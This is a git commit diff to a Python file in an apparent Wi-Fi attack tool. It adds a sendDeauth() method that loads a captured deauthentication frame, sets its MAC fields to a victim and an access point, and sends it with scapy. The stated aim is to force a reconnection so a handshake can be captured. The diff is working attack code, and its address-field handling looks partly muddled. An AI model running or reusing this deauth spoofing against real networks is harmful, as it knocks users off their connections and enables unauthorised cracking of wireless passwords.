e41829be95a88178dc7f47f1a201ddf9dbc8740a
richard <rhowe425@gmail.com>
2020-08-03 20:38:58 -0400

    Implemented sendDeauth() method

--- Src/Wifi.py
+++ Src/Wifi.py
@@ -1,10 +1,8 @@
 from os import geteuid
 from util.IO import IO
+from scapy.all import *
 from netifaces import interfaces
 from subprocess import Popen, PIPE
-from scapy.all import sniff, rdpcap, send
-from socket import socket, AF_PACKET, SOCK_RAW
-
 
 ''' 
     Class responsible for automating the process of recording 
@@ -19,6 +17,7 @@ class WiFi:
         self.NICs = []
         self.SSIDs = {}
         self.device = ''
+        self.deauth = rdpcap('../artifacts/deauth.pcap', count = 1)[0]
 
     '''
         Searches for all available NIC's and returns
@@ -67,17 +66,23 @@ class WiFi:
         '''
             Sends a spoofed deauth packet from the client (CLI) to the access point
             (AP) in order to generate a 3-way handshake upon reconnection.
-            @param: AP: Access point that receives the deauth packet.
-            @param CLI: Client that will be deauthenticated from the access point.
-            @param NIC: Network card to send the deauth packet on.
+            @param SMAC: MAC of victim that will deauthenticate with the AP.
+            @param DMAC: MAC of AP that will receive victim deauth packet.
             @return: Boolean value representing the success of the method.
         '''
-        def sendDeauth(self, AP, CLI, NIC):
-            file = rdpcap('../artifacts/deauth.pcap')
-            packet = socket(AF_PACKET, SOCK_RAW)
+        def sendDeauth(self, SMAC, DMAC):
+            # Receiver MAC (Dst)
+            self.deauth.addr1 = DMAC
+            # Destination MAC
+            self.deauth.addr2 = DMAC
+            # Transmitter MAC (Src)
+            self.deauth.addr3 = SMAC
+            # Source MAC -> BSSID MAC in WireShark, not required in Scapy?
+            self.deauth.addr4 = SMAC
 
-            # TODO Fill in SSID, AP, CLI MAC fields of deauth packet
-
-
-
+            try:
+                # Send packet on layer 2
+                srp(self.deauth)
+            except Exception as e:
+                IO.writeToErrorLog(e)
 
